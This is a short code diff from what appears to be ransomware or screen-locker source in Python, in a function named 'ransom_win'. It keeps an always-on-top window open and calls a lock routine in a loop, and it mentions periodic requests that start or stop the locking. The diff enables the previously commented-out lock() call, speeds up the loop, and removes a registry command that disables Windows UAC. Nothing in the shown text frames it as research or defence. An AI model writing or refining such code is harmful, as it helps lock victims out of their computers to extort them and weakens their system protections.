@@ -49,8 +49,8 @@ def ransom_win():
     wa.call('wm', 'attributes', '.', '-topmost', '1')  # always on top
     while 1:
         wa.update()
-        #lock()
-        sleep(1)
+        lock()
+        sleep(0.1)
         a_field = get(final.active_field)  # check if needs to be closed
         if a_field == "0":
             wa.destroy()
@@ -59,7 +59,6 @@ def ransom_win():
 
 """ send requests each 15 seconds, start/stop locking"""
 def main():
-    subprocess.Popen("reg.exe ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA /t REG_DWORD /d 0 /f")
     print("run")
     try:
         psxmlgen = subprocess.Popen(['powershell.exe',
